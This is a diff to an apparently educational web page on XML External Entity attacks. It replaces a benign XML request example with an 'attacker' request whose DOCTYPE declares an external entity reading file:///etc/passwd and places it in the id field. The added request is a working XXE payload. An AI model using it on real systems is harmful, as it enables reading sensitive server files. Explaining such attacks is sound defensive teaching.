@@ -264,9 +264,16 @@ Content-Type: application/xml<br><br>
 &lt;?xml version="1.0" encoding="UTF-8"?><br>
   &lt;user><br>
       &lt;id>54433&lt;/id><br>
-      &lt;name>Test&lt;/name><br>
-      &lt;email>test@example.com&lt;/email><br>
+  &lt;/user><br>
+</code><br>
+
+What an attacker can do is:<br>
+<code>POST /account HTTP/1.1<br>
+Host: example.com<br>
+Content-Type: application/xml<br><br>
+&lt;?xml version="1.0" encoding="UTF-8"?><br>
+&lt;!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+  &lt;user><br>
+      &lt;id>&xxe;&lt;/id><br>
   &lt;/user><br>
 </code>
-
-
